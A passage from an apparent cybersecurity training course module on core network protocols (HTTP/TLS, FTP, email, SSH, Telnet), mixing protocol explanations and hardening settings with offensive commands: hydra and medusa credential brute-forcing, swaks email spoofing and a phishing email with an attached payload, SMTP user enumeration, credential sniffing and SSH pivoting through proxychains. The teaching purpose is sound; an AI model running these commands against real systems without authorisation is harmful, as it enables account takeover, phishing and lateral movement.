# Stage 1.5 — Core Protocols
### From Zero to Cybersecurity Professional | Complete Roadmap Series

> **Series:** Cybersecurity × OT/ICS Security — Full Roadmap  
> **Stage:** 1 — Network Fundamentals  
> **Module:** 1.5 — Core Protocols  
> **Level:** Beginner → Advanced  
> **Prerequisites:** Stage 1.4 — IP Addressing and Subnetting  
> **Next Module:** 1.6 — Network Devices

---

## Table of Contents

1. [Why Protocols Are the Attack Surface](#1-why-protocols-are-the-attack-surface)
2. [HTTP and HTTPS](#2-http-and-https)
3. [FTP, SFTP, and FTPS](#3-ftp-sftp-and-ftps)
4. [SMTP, POP3, and IMAP](#4-smtp-pop3-and-imap)
5. [SSH — Secure Shell](#5-ssh--secure-shell)
6. [Telnet — The Insecure Predecessor](#6-telnet--the-insecure-predecessor)
7. [SNMP — Simple Network Management Protocol](#7-snmp--simple-network-management-protocol)
8. [NTP — Network Time Protocol](#8-ntp--network-time-protocol)
9. [LDAP — Lightweight Directory Access Protocol](#9-ldap--lightweight-directory-access-protocol)
10. [RDP — Remote Desktop Protocol](#10-rdp--remote-desktop-protocol)
11. [SMB — Server Message Block](#11-smb--server-message-block)
12. [Protocol Security Matrix](#12-protocol-security-matrix)
13. [OT/ICS Protocol Context](#13-otics-protocol-context)
14. [Hands-On Exercises](#14-hands-on-exercises)
15. [Module Summary](#15-module-summary)

---

## 1. Why Protocols Are the Attack Surface

Protocols are agreements. When two systems communicate, they follow a set of rules — the protocol — that defines exactly how the conversation happens. The security implication is profound: **every rule in a protocol is a potential attack vector, and every weakness in a protocol's design is a permanent vulnerability in every system that implements it.**

Real breaches by protocol:

**EternalBlue (2017):** NSA-developed exploit targeting SMBv1. Used by WannaCry to infect 200,000 machines in 150 countries in 72 hours. Colonial Pipeline, NHS hospitals, Telefónica — all hit. The vulnerability was in how SMBv1 handled certain transaction requests. One protocol weakness, global catastrophe.

**BlueKeep (CVE-2019-0708):** Pre-authentication RDP vulnerability. No credentials required. Remote code execution as SYSTEM. Microsoft issued patches for out-of-support Windows XP specifically because the threat was that severe.

**Log4Shell (CVE-2021-44228):** While a software vulnerability, it was exploited entirely through HTTP — specifically through HTTP headers that contained JNDI lookup strings. The attack surface was every application that logged HTTP request headers using Log4j.

**FTP credential exposure:** Default FTP credentials on network devices enabled the 2016 Mirai botnet to compromise 600,000 IoT devices and launch the largest DDoS attack in history (1.2 Tbps against Dyn DNS), taking down Twitter, Netflix, Reddit, and Amazon simultaneously.

**For your OT/ICS path:** Telnet is still the management interface on a significant percentage of industrial network switches, RTUs, and legacy PLCs. SNMP v1 and v2c with default community strings expose the management plane of every industrial network device. NTP vulnerabilities can desynchronise protection relay timestamps, causing grid protection systems to malfunction. Understanding these protocols is not optional — it is the foundation of every assessment you will ever conduct.

---

## 2. HTTP and HTTPS

### 2.1 HTTP — HyperText Transfer Protocol

HTTP is the application-layer protocol that powers the web. Every time a browser loads a page, every time an API is called, every time a SCADA HMI fetches data from a web service — HTTP is the underlying protocol.

HTTP runs over TCP (default port 80). It is stateless — each request is independent. The server does not remember previous requests unless the application implements session management (cookies, tokens).

**HTTP Request Structure:**

```
Method URI HTTP-Version\r\n
Header-Name: Header-Value\r\n
Header-Name: Header-Value\r\n
\r\n
[Optional Body]

Example:
POST /api/login HTTP/1.1\r\n
Host: target.com\r\n
User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n
Content-Type: application/json\r\n
Content-Length: 42\r\n
Cookie: session=abc123def456\r\n
\r\n
{"username": "admin", "password": "test123"}
```

**HTTP Methods and Security Relevance:**

```
GET     Retrieve a resource. Parameters in URL. Logged in server logs, browser history,
        proxy logs, Referer headers. Never use GET for sensitive data.
        
POST    Send data in request body. Not in URL. Used for form submissions, API calls.
        Still logged, but body usually not logged by default.
        
PUT     Create or replace a resource at a specific URI. 
        If enabled on web servers without auth: arbitrary file upload.
        
DELETE  Delete a resource. If enabled without auth: data destruction.

PATCH   Partial update to a resource.

OPTIONS Returns allowed HTTP methods for a resource.
        Security use: enumerate what methods a server accepts.
        
HEAD    Like GET but returns only headers, no body. Used for:
        - Checking if resource exists without downloading it
        - Getting metadata (Content-Length, Last-Modified)
        
TRACE   Echoes the request back. Used for diagnostics.
        Security risk: Cross-Site Tracing (XST) — can steal cookies
        via JavaScript if HttpOnly flag not set.
        Should be DISABLED on all web servers.
        
CONNECT Establish a tunnel through a proxy to a destination.
        Allows HTTPS through HTTP proxies.
        Abuse: use proxy as relay to other internal systems.
```

**HTTP Response Structure:**

```
HTTP/1.1 200 OK\r\n
Server: Apache/2.4.51\r\n           ← Version disclosure — information to attacker
Content-Type: text/html; charset=utf-8\r\n
Set-Cookie: session=xyz789; Path=/; HttpOnly; Secure; SameSite=Strict\r\n
X-Frame-Options: DENY\r\n           ← Security header
Content-Security-Policy: default-src 'self'\r\n  ← Security header
Strict-Transport-Security: max-age=31536000; includeSubDomains\r\n
\r\n
[HTML Body]
```

**HTTP Status Codes — Security Relevance:**

```
1xx Information:
  100 Continue — client should send body after receiving this

2xx Success:
  200 OK
  201 Created — resource was created (PUT/POST success)
  204 No Content — success but no body (DELETE success)

3xx Redirection:
  301 Moved Permanently — permanent redirect (cached by browser)
  302 Found — temporary redirect
  Open Redirect vulnerability: if the redirect URL is user-controlled

4xx Client Errors:
  400 Bad Request — malformed request (useful for fuzzing — different errors reveal different things)
  401 Unauthorized — authentication required (auth bypass target)
  403 Forbidden — authenticated but no permission (privilege escalation target)
  404 Not Found — resource doesn't exist
  405 Method Not Allowed — method not permitted for this resource
  429 Too Many Requests — rate limiting active

5xx Server Errors:
  500 Internal Server Error — server crashed (may reveal stack traces, source code paths)
  502 Bad Gateway — upstream server error
  503 Service Unavailable — server overloaded (DoS indicator)
```

**HTTP Headers — Security Implications:**

```
Request headers of interest to security:
  Host:           Target hostname — Host header injection if not validated
  Authorization:  Credentials (Basic base64, Bearer token, API key)
  Cookie:         Session tokens — primary theft target
  User-Agent:     Client identification — spoofed by attackers
  Referer:        Previous page URL — can leak sensitive URLs in logs
  X-Forwarded-For:Client IP when behind proxy — can be spoofed to bypass IP restrictions
  Content-Type:   Body format — affects how server processes body (JSON vs XML vs multipart)
  Origin:         CORS pre-flight source — CORS misconfiguration exploitation

Response headers of interest:
  Server:           Software version — remove or mask (information disclosure)
  X-Powered-By:     Framework version — remove (information disclosure)
  Set-Cookie:       Session cookie attributes:
                    HttpOnly: prevents JS access (XSS cookie theft mitigation)
                    Secure: only sent over HTTPS
                    SameSite: CSRF mitigation (Lax/Strict/None)
  Location:         Redirect target — open redirect if user-controlled
  Access-Control-Allow-Origin: CORS policy — * is dangerous
```

### 2.2 HTTPS — HTTP Secured with TLS

HTTPS is HTTP running over TLS (Transport Layer Security). The connection is established with a TLS handshake before any HTTP data is exchanged. Port 443.

**What HTTPS protects:**
- Confidentiality: traffic encrypted, intermediate parties cannot read it
- Integrity: traffic cannot be modified in transit without detection
- Authentication: server proves its identity via certificate

**What HTTPS does NOT protect:**
- Metadata: destination IP and hostname (via SNI in TLS handshake) are visible
- Traffic volume and timing: can reveal page identity even with encryption
- Server-side code: vulnerabilities in the application still exploitable
- TLS termination points: CDN, load balancer, WAF decrypt traffic — they see plaintext

**SSL/TLS Attack History:**

```
BEAST (CVE-2011-3389):
  TLS 1.0 CBC mode vulnerability
  Attacker on same network could decrypt HTTPS cookies
  Fixed: upgrade to TLS 1.1+, use RC4 (then later discovered RC4 was broken too)

CRIME (CVE-2012-4929):
  TLS compression oracle — recover HTTPS session cookies
  Fixed: disable TLS compression (now disabled by default)

BREACH (2013):
  HTTP-level compression oracle — not a CVE but a design weakness
  Affects any HTTPS connection with compressed body
  Mitigation: rate-limit guesses, use CSRF tokens, disable HTTP compression

POODLE (CVE-2014-3566):
  SSLv3 CBC padding oracle — decrypt session cookies
  Fixed: disable SSLv3 entirely

Heartbleed (CVE-2014-0160):
  OpenSSL memory leak via malformed heartbeat request
  Up to 64KB of server memory per request — leaked private keys, passwords, session tokens
  No authentication required
  Affected: ~17% of secure web servers at time of disclosure
  Fixed: patch OpenSSL, rotate all certificates and credentials

FREAK (CVE-2015-0204):
  Force client to use export-grade RSA (512-bit, breakable in hours)
  Then factor the key and decrypt traffic
  Fixed: disable export cipher suites

Logjam (CVE-2015-4000):
  Force server to use 512-bit Diffie-Hellman — factorable
  Fixed: use 2048-bit DH minimum, prefer ECDH

DROWN (CVE-2016-0800):
  SSLv2 protocol attacks allowing decryption of TLS sessions
  Any server sharing a private key with an SSLv2-enabled server was vulnerable
  Fixed: disable SSLv2 everywhere, don't share private keys

ROBOT (CVE-2017-17382 and others, 2017):
  Return of BLEICHENBACHER's Oracle Threat
  19-year-old RSA PKCS#1 padding oracle resurfaced in TLS 1.2
  Affected: F5, Cisco, Citrix, Palo Alto, many others
  
Lucky13 (CVE-2013-0169):
  Timing attack against TLS CBC mode
  Fixed: constant-time MAC verification
```

**Testing TLS Security:**

```bash
# testssl.sh — comprehensive TLS security assessment
# Install: git clone --depth 1 https://github.com/drwetter/testssl.sh.git
./testssl.sh target.com:443

# Check supported TLS versions (older = insecure):
openssl s_client -connect target.com:443 -tls1    # TLS 1.0 (deprecated)
openssl s_client -connect target.com:443 -tls1_1  # TLS 1.1 (deprecated)
openssl s_client -connect target.com:443 -tls1_2  # TLS 1.2 (acceptable)
openssl s_client -connect target.com:443 -tls1_3  # TLS 1.3 (preferred)

# If -tls1 or -tls1_1 succeed: server supports deprecated protocols — vulnerability

# Check certificate details:
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
    openssl x509 -noout -text | grep -E "Subject:|Issuer:|Not After|SAN|DNS:"

# Check for weak cipher suites:
nmap --script ssl-enum-ciphers -p 443 target.com
# Look for: RC4, DES, 3DES, EXPORT, NULL — all weak

# Check HTTP security headers:
curl -sI https://target.com | grep -iE "strict-transport|content-security|x-frame|x-content-type|referrer"

# Full automated scan:
nmap -sV --script ssl-heartbleed,ssl-poodle,ssl-dh-params target.com -p 443

# Check HSTS:
curl -sI https://target.com | grep -i "Strict-Transport-Security"
# max-age should be at least 31536000 (1 year)
# includeSubDomains extends to all subdomains
# preload submits domain to browser HSTS preload list
```

**SSL Stripping Attack:**

```
SSL Stripping (Moxie Marlinspike, 2009):
  Target: HTTP connections that redirect to HTTPS
  
  Attack sequence:
  1. Attacker performs MITM (ARP poisoning, rogue AP, etc.)
  2. Client sends HTTP request: GET http://bank.com/
  3. Attacker intercepts, forwards to bank.com over HTTPS
  4. Bank responds with redirect to https://bank.com/
  5. Attacker intercepts the redirect, converts to HTTP
  6. Client receives HTTP response (thinks it's already using HTTP)
  7. All subsequent communication: Client ←HTTP→ Attacker ←HTTPS→ Bank
  8. Attacker sees all plaintext traffic including passwords

Detection:
  Browser shows "Not Secure" warning (HTTP)
  URL bar shows http:// instead of https://
  
Mitigation:
  HSTS: Once visited over HTTPS, browser always uses HTTPS regardless of link
  HSTS preload: Browser never tries HTTP, even on first visit
  
Tool: sslstrip (Moxie Marlinspike), bettercap's hstshijack module
```

> **Key Insight:** HTTPS protects the wire, not the application. A perfectly implemented TLS connection to a vulnerable web application still results in a breach. HTTP security headers (HSTS, CSP, X-Frame-Options) are not optional — they are the difference between a vulnerability being exploitable or not.

---

## 3. FTP, SFTP, and FTPS

### 3.1 FTP — File Transfer Protocol

FTP (RFC 959, 1985) predates modern security thinking. It was designed for maximum compatibility and zero security. Understanding its architecture reveals exactly why it is dangerous and why it persists despite being dangerous.

**FTP Control and Data Channels:**

```
FTP uses TWO separate TCP connections:

Control channel (TCP 21):
  Client → Server: commands (USER, PASS, LIST, RETR, STOR, QUIT)
  Server → Client: responses (220 ready, 331 password required, 230 logged in)
  Always client-initiated
  Connection persists for the entire FTP session

Data channel:
  Used for: directory listings, file transfers
  Created NEW for each transfer
  TWO modes determine who initiates:
  
  Active mode (PORT command):
    Client sends: PORT 192,168,1,5,200,100
    (Decoded: 192.168.1.5, port = 200×256+100 = 51300)
    Server connects FROM port 20 TO client 192.168.1.5:51300
    Problem: Firewall/NAT blocks incoming connections to client
    
  Passive mode (PASV command):
    Client sends: PASV
    Server responds: 227 Entering Passive Mode (192,168,1,100,100,50)
    (Server is listening on port 100×256+50 = 25650)
    Client connects TO server 192.168.1.100:25650
    Firewall-friendly: client initiates both connections
```

**FTP Security Failures:**

```
1. Credentials transmitted in cleartext:
   USER admin\r\n                   ← Username visible on wire
   PASS secretpassword\r\n          ← Password visible on wire
   
   Any network observer captures credentials.
   Wireshark filter: ftp.request.command == "PASS"
   
2. Data transmitted in cleartext:
   All file content visible during transfer
   Directory listings visible
   
3. Anonymous FTP:
   USER anonymous\r\n
   PASS anystring@\r\n              ← Convention: use email as password
   If server allows anonymous: full access without credentials
   Many legacy servers still have anonymous enabled
   
4. Bounce attack:
   FTP PORT command specifies third-party IP:port for data connection
   Server connects to the third party "on behalf of" the attacker
   Used to: port scan from FTP server, bypass IP-based access controls
   Mitigated by: checking PORT address matches client IP
   
5. PASV injection:
   If attacker can MITM control channel:
   Replace server's PASV response with attacker-controlled IP:port
   Client connects to attacker for data transfer → credential capture
```

**FTP in Practice — Attack and Detection:**

```bash
# Check for anonymous FTP access:
nmap --script ftp-anon -p 21 target_ip
# Or manually:
ftp target_ip
# At login prompt: user anonymous, password anything

# FTP banner grabbing (reveals server software and version):
nc target_ip 21
# Response: 220 ProFTPD 1.3.5 Server (Debian) [...]
# Or: 220 Microsoft FTP Service
# Use version for vulnerability lookup

# Bruteforce FTP credentials:
hydra -L users.txt -P passwords.txt ftp://target_ip
medusa -h target_ip -U users.txt -P passwords.txt -M ftp

# Capture FTP credentials in Wireshark:
# Filter: ftp.request.command == "USER" or ftp.request.command == "PASS"

# FTP connection tracking with tcpdump:
sudo tcpdump -i eth0 -n 'port 21 or port 20' -A

# Enumerate FTP on a network:
sudo nmap -sV -p 21 --open 192.168.1.0/24
```

### 3.2 SFTP — SSH File Transfer Protocol

SFTP is NOT FTP over SSH (that is FTPS). It is an entirely different protocol — a subsystem of SSH that provides file transfer functionality.

```
SFTP characteristics:
  Port: 22 (same as SSH — runs as SSH subsystem)
  Encryption: full encryption via SSH (AES, ChaCha20)
  Authentication: SSH authentication (password, key-based)
  Channel: single encrypted channel (no separate data channel)
  Commands: binary protocol (not human-readable like FTP)
  
SFTP has no equivalent to FTP's cleartext credentials.
SFTP has no equivalent to FTP's cleartext file transfer.
SFTP is the correct replacement for FTP in all cases.
```

```bash
# SFTP usage:
sftp user@host                              # Interactive session
sftp -P 2222 user@host                      # Non-standard SSH port

# SFTP batch mode (automation):
sftp -b batch_file user@host                # Execute commands from file

# SFTP within scripts:
sftp user@host << 'EOF'
cd /remote/directory
put localfile.txt
get remotefile.txt
ls
bye
EOF

# Use SSH key authentication (no password prompts in scripts):
sftp -i ~/.ssh/id_ed25519 user@host

# Scan for SFTP capability (runs on SSH port):
nmap -sV -p 22 target_ip
# If SSH is open, SFTP is almost certainly available
# Try: ssh target_ip subsystem sftp
```

### 3.3 FTPS — FTP Secure (FTP over TLS)

FTPS adds TLS to FTP. It is NOT SFTP. It still has the dual-channel architecture, which creates firewall complexity.

```
Two FTPS modes:

Explicit FTPS (FTPES):
  Client connects to port 21 (standard FTP)
  Client sends AUTH TLS command
  Negotiates TLS on control channel
  PASV for data channel (also TLS encrypted)
  
Implicit FTPS:
  Client connects to port 990 (dedicated FTPS port)
  TLS immediately negotiated
  No explicit AUTH command
  Data port: 989

FTPS vs SFTP comparison:
  Feature         FTPS           SFTP
  Protocol        FTP + TLS      SSH subsystem
  Port            21/990 + range  22
  Firewall        Complex        Simple
  Channels        Two            One
  Authentication  FTP auth + TLS SSH auth
  Encryption      TLS            SSH
  Legacy compat   Yes            No (different protocol)
```

> **Key Insight:** FTP should be eliminated from every environment. Every argument for keeping it ("it's only internal," "only trusted users," "we've always used it") can be countered with "it transmits credentials in cleartext." SFTP achieves everything FTP does, without the cleartext exposure. If you find FTP during an assessment — in IT or OT environments — it is a finding. Period.

---

## 4. SMTP, POP3, and IMAP

### 4.1 Email Architecture — Three Protocols, One System

Email involves three distinct protocols working together:

```
SMTP (Simple Mail Transfer Protocol):    SENDING email
  Port 25: Server-to-server (MTA to MTA)
  Port 587: Client submission (MUA to MTA) — requires auth
  Port 465: SMTP over TLS (legacy, but still used)

POP3 (Post Office Protocol v3):          RETRIEVING email (download)
  Port 110: POP3 cleartext
  Port 995: POP3S (over TLS)

IMAP (Internet Message Access Protocol): RETRIEVING email (sync)
  Port 143: IMAP cleartext
  Port 993: IMAPS (over TLS)

Email flow:
  Sender → [SMTP/587] → Sender's MTA → [SMTP/25] → Recipient's MTA
           → Mailbox storage
  Recipient → [IMAP/IMAPS or POP3/POP3S] → Read email
```

### 4.2 SMTP — Simple Mail Transfer Protocol

SMTP (RFC 5321) governs how email is transmitted between servers. Understanding SMTP is essential because email is the primary phishing and malware delivery vector.

**SMTP Session Example:**

```
TCP connection established to port 25

S: 220 mail.example.com ESMTP Postfix
C: EHLO attacker.com                    ← Extended HELLO (ESMTP)
S: 250-mail.example.com Hello attacker
S: 250-SIZE 52428800
S: 250-STARTTLS                         ← TLS upgrade available
S: 250-AUTH LOGIN PLAIN                 ← Authentication methods
S: 250 DSN

C: MAIL FROM:<sender@attacker.com>      ← Envelope sender (can be spoofed)
S: 250 Ok

C: RCPT TO:<victim@example.com>         ← Recipient
S: 250 Ok

C: DATA                                 ← Start message body
S: 354 End data with <CR><LF>.<CR><LF>

C: From: CEO <ceo@legitimate.com>       ← Header From (displayed to user, can differ from envelope)
C: To: victim@example.com
C: Subject: Urgent: Wire Transfer Required
C: Date: Mon, 29 May 2026 10:00:00 +0000
C:                                       ← Blank line separates headers from body
C: Please urgently transfer $50,000 to account...
C: .                                    ← Single dot on line = end of message
S: 250 Ok: queued as ABC123

C: QUIT
S: 221 Bye
```

**The Critical Security Problem — Email Spoofing:**

The `MAIL FROM` (envelope sender) and the `From:` header (displayed sender) can be completely different. A mail server that does not validate these can receive and deliver email claiming to be from any domain.

```
Proof-of-concept email spoofing (test only on systems you own):

# Using sendmail/postfix locally:
echo "Subject: Test
From: ceo@company.com
To: victim@company.com

This is a spoofed email" | sendmail -f "ceo@company.com" victim@company.com

# Using swaks (Swiss Army Knife for SMTP):
swaks --to victim@target.com \
      --from ceo@target.com \          # Spoofed From
      --server mail.target.com \
      --header "Subject: Urgent" \
      --body "Please approve this payment immediately"

# Check if a mail server allows relaying (open relay):
swaks --to nonexistent@gmail.com \
      --from fake@fake.com \
      --server target_mail_server
# If it accepts: open relay — will deliver email from anyone to anyone
```

**Email Authentication — SPF, DKIM, DMARC (Revisited from 1.4):**

```
Without proper authentication:
  Anyone can send email claiming to be from your domain
  BEC (Business Email Compromise) attacks exploit this
  FBI reported $2.7 billion in BEC losses in 2022

Checking email authentication on a received email:
  Look at email headers in your mail client (View Source/Original)
  
  Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of sender@example.com) smtp.mailfrom=sender@example.com;
       dkim=pass header.i=@example.com header.s=selector1;
       dmarc=pass (p=REJECT sp=REJECT) header.from=example.com
  
  All three pass = legitimate email
  Any fail = suspicious — may be spoofed
```

**SMTP Security Checks:**

```bash
# Check if STARTTLS is supported (TLS upgrade):
openssl s_client -connect mail.target.com:25 -starttls smtp
# If no TLS: credentials and content transmitted in cleartext

# Check for open relay:
nmap --script smtp-open-relay -p 25 mail.target.com

# Enumerate SMTP users (VRFY/EXPN commands):
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} \
    -p 25 mail.target.com
# VRFY: verify if user exists
# EXPN: expand mailing list
# RCPT TO: most servers allow testing valid recipients

# Manual VRFY:
nc mail.target.com 25
EHLO test.com
VRFY admin@target.com       # 250 = user exists, 550 = doesn't exist
VRFY user@target.com

# Check SPF record:
dig TXT target.com | grep "v=spf1"

# Check DMARC:
dig TXT _dmarc.target.com

# Send test email via SMTP for phishing simulation (authorised only):
swaks --to target@victim.com \
      --from helpdesk@company.com \
      --server internal-mail-server \
      --tls \
      --auth-user helpdesk \
      --auth-password password \
      --header "Subject: Password Reset Required" \
      --attach payload.pdf
```

### 4.3 POP3 vs IMAP — Security Differences

```
POP3:
  Downloads email from server, optionally deletes server copy
  Email stored locally after download
  No sync between multiple devices (once downloaded on laptop, not on phone)
  Simple protocol — limited commands
  Credentials transmitted in cleartext unless POP3S (port 995)
  
  Authentication (plaintext on port 110):
  +OK POP3 server ready
  USER admin
  +OK
  PASS password123    ← Cleartext password on wire
  +OK 5 messages waiting

IMAP:
  Email stored on server — client syncs
  Multiple devices see same mailbox state
  Rich protocol — search, folders, flags
  Credentials transmitted in cleartext unless IMAPS (port 993)
  
  Why IMAP is the forensic gold mine:
  Deleted emails often remain server-side in Trash folder
  Read/unread status reveals when attacker accessed account
  Login records show access from multiple IPs (BEC investigation)
```

```bash
# Brute force email credentials:
hydra -L users.txt -P passwords.txt imap://mail.target.com
hydra -L users.txt -P passwords.txt pop3://mail.target.com
hydra -L users.txt -P passwords.txt smtp://mail.target.com:587

# Connect to IMAP manually (forensics):
openssl s_client -connect mail.target.com:993    # IMAPS
# A1 LOGIN user@domain.com password
# A2 LIST "" "*"              ← List all folders
# A3 SELECT INBOX
# A4 FETCH 1:* (FLAGS ENVELOPE)    ← List all messages with metadata
# A5 FETCH 1 BODY[]               ← Download message 1
# A6 SELECT "Sent"               ← Access Sent folder
# A7 SELECT "Deleted Items"       ← Recover deleted emails

# Capture cleartext IMAP credentials:
sudo tcpdump -i eth0 -n -A 'port 143' | grep -E "LOGIN|PASS"
```

> **Key Insight:** Email protocols are the primary delivery mechanism for malware, phishing, and BEC attacks. SPF + DKIM + DMARC with p=reject is the only configuration that actively prevents domain spoofing — anything less is a gap. Cleartext POP3 and IMAP should not exist; IMAPS/POP3S are the minimum, and even better is requiring OAuth-based authentication.

---

## 5. SSH — Secure Shell

### 5.1 SSH Architecture

SSH (Secure Shell, RFC 4253) provides cryptographically secured remote shell access, file transfer (SFTP), and port forwarding. It was designed explicitly to replace Telnet and rlogin with an encrypted alternative.

**SSH Protocol Layers:**

```
SSH-TRANSPORT (RFC 4253):
  Negotiates: host key algorithm, cipher, MAC, compression
  Performs: key exchange (Diffie-Hellman or ECDH)
  Establishes: symmetric session key
  Provides: encryption, integrity, optional compression
  
SSH-USERAUTH (RFC 4252):
  Authentication methods:
    - publickey: verify signature with user's private key
    - password: encrypt password with session key, send to server
    - keyboard-interactive: challenge-response
    - hostbased: based on client hostname (dangerous — rarely used)
    - gssapi-with-mic: Kerberos/GSSAPI
    - none: used to determine what methods server accepts
  
SSH-CONNECTION (RFC 4254):
  Multiplexes multiple logical channels over one SSH connection:
    - Session channel: shell, command execution, subsystems (SFTP)
    - Direct-tcpip: local port forwarding (tunnel)
    - Forwarded-tcpip: remote port forwarding
    - X11: X11 forwarding
```

**SSH Key Exchange:**

```
SSH connection setup:
1. Client connects to server TCP 22
2. Server sends identification string: SSH-2.0-OpenSSH_8.9
3. Client sends identification string: SSH-2.0-OpenSSH_8.9
4. Both parties negotiate algorithms (KEY EXCHANGE INIT):
   - Key exchange: curve25519-sha256 (preferred), diffie-hellman-group14-sha256
   - Host key: ssh-ed25519, rsa-sha2-512, ecdsa-sha2-nistp256
   - Cipher: chacha20-poly1305, aes256-gcm, aes128-ctr
   - MAC: hmac-sha2-256, hmac-sha2-512
5. Diffie-Hellman key exchange → shared secret
6. Session key derived from shared secret
7. Host key authentication:
   Server signs a hash of the negotiated parameters with its private host key
   Client verifies signature against trusted host public key
   → Proves server is who it claims (TOFU — Trust On First Use by default)
8. User authentication begins
```

**SSH Host Key Verification — The Security Foundation:**

```
First connection to a new host:
  $ ssh user@192.168.1.100
  The authenticity of host '192.168.1.100' can't be established.
  ED25519 key fingerprint is SHA256:abc123...
  Are you sure you want to continue connecting (yes/no)?

This prompt is critical:
  YES: Accept and cache the host key (stored in ~/.ssh/known_hosts)
       Future connections verify against this cached key
  NO:  Decline — connection aborted

If host key changes later:
  WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!
  ...
  POSSIBLE HACKS! SOMEONE IS DOING SOMETHING NASTY!

This warning means:
  A) The server's SSH keys were regenerated (legitimate — server reinstall)
  B) A MITM attack is redirecting your connection to a fake server
  C) The IP now points to a different server (legitimate — server replaced)

Action: Verify the host key out-of-band before accepting.
NEVER blindly accept a changed host key.
```

### 5.2 SSH Authentication Methods

**Password Authentication:**

```bash
ssh -o PreferredAuthentications=password user@host  # Force password auth
# Risk: brute force possible, password in memory, cleartext inside TLS (but TLS encrypted on wire)
# Disable: PasswordAuthentication no in /etc/ssh/sshd_config
```

**Public Key Authentication (Recommended):**

```bash
# Generate key pair:
ssh-keygen -t ed25519 -C "user@machine"    # Ed25519 — best option
ssh-keygen -t rsa -b 4096 -C "user@machine"  # RSA 4096 — legacy compat

# Files created:
# ~/.ssh/id_ed25519       ← Private key (NEVER share this, protect with passphrase)
# ~/.ssh/id_ed25519.pub   ← Public key (safe to share)

# Deploy public key to server:
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@host
# Appends to ~/.ssh/authorized_keys on server

# Manual deployment:
cat ~/.ssh/id_ed25519.pub | ssh user@host "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# How it works:
# 1. Client sends: "I want to authenticate with key X"
# 2. Server checks: is X in authorized_keys? YES
# 3. Server sends challenge: random bytes encrypted with key X's public key
# 4. Client decrypts with private key, signs the result
# 5. Server verifies signature → only holder of private key could do this
```

### 5.3 SSH in Offensive Security

**SSH Brute Force:**

```bash
# Hydra SSH brute force:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://target_ip
hydra -l root -P passwords.txt ssh://target_ip -t 4    # -t = threads (4 for SSH)

# Medusa:
medusa -h target_ip -U users.txt -P passwords.txt -M ssh -t 4

# Ncrack:
ncrack -p 22 --user root -P passwords.txt target_ip

# Default credentials common on IoT/OT:
# root:root, admin:admin, admin:password, pi:raspberry (Raspberry Pi)
# These are worth trying before a full brute force

# Detect SSH brute force in logs:
grep "Failed password" /var/log/auth.log | tail -20
grep "Invalid user" /var/log/auth.log | awk '{print $10}' | sort | uniq -c | sort -rn
```

**SSH Tunnelling — Pivoting:**

```bash
# Local port forwarding:
# Forward local port 8080 to internal web server through SSH:
ssh -L 8080:192.168.2.100:80 user@192.168.1.100
# Access 192.168.2.100:80 via localhost:8080

# Remote port forwarding:
# Expose attacker's listener through SSH to target's network:
ssh -R 4444:localhost:4444 user@192.168.1.100
# Connections to 192.168.1.100:4444 reach attacker's localhost:4444

# Dynamic (SOCKS) proxy:
ssh -D 1080 user@192.168.1.100    # SOCKS5 proxy on localhost:1080
# Use with proxychains for transparent pivoting:
proxychains nmap -sT 10.10.10.0/24   # Scan through SOCKS proxy

# Autossh — persistent tunnels:
autossh -M 0 -f -N -D 1080 user@pivot_host
# -M 0: no monitoring (use ServerAliveInterval instead)
# -f: run in background
# -N: no command execution

# Real-world pivoting example:
# Access 10.10.10.0/24 (internal network) through compromised host 192.168.1.100:
ssh -D 9050 user@192.168.1.100 -N &
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
proxychains nmap -sT -Pn -p 22,80,443,445 10.10.10.0/24
```

### 5.4 SSH Hardening

```bash
# /etc/ssh/sshd_config — security configuration:

# Disable root login:
PermitRootLogin no
# Why: even with strong auth, root login makes brute force more valuable
# Best practice: sudo from regular user

# Disable password authentication:
PasswordAuthentication no
# Why: eliminates brute force entirely. Key-only auth.
# Requirement: all users must have deployed public keys first

# Restrict to specific users:
AllowUsers alice bob            # Only these users can SSH
AllowGroups ssh-users           # Only members of this group

# Change default port (minor obscurity, reduces automated scanning):
Port 2222
# Not a security control, but reduces log noise from automated scanners

# Disable empty passwords:
PermitEmptyPasswords no

# Set authentication timeout:
LoginGraceTime 30              # 30 seconds to authenticate, then disconnect

# Limit authentication attempts:
MaxAuthTries 3                  # Disconnect after 3 failures

# Disable X11 forwarding:
X11Forwarding no
# Unless needed, X11 forwarding is unnecessary attack surface

# Disable TCP forwarding (if SSH is for shell only):
AllowTcpForwarding no
AllowStreamLocalForwarding no
GatewayPorts no

# Use strong ciphers only:
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp521

# Enable two-factor authentication (Google Authenticator or similar):
# Requires libpam-google-authenticator installed
AuthenticationMethods publickey,keyboard-interactive
# User needs both a valid SSH key AND a TOTP code

# Log verbose:
LogLevel VERBOSE                # More detail in /var/log/auth.log

# Restart SSH to apply:
sudo systemctl restart ssh
sudo sshd -t                    # Test configuration for errors first
```

> **Key Insight:** SSH is the most trusted remote access protocol in existence, which makes it the most valuable target. An attacker with valid SSH credentials or an SSH private key owns the machine. Key-based authentication eliminates brute force entirely. Every SSH deployment without `PasswordAuthentication no` is an unacceptable risk.

---

## 6. Telnet — The Insecure Predecessor

### 6.1 What Telnet Is and Why It Still Exists

Telnet (RFC 854, 1983) provides remote terminal access. It predates security as a design consideration by more than a decade. Everything — credentials, commands, output — is transmitted in cleartext over TCP port 23.

```
Telnet session (what anyone on the network sees):

Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.

User Access Verification
Username: admin
Password: secretpassword123        ← Visible in plaintext

Router>enable
Password: enablepassword           ← Also visible

Router#show running-config
...entire device configuration transmitted in cleartext...
```

There is no legitimate security argument for using Telnet where SSH is available. Yet Telnet remains pervasive because:

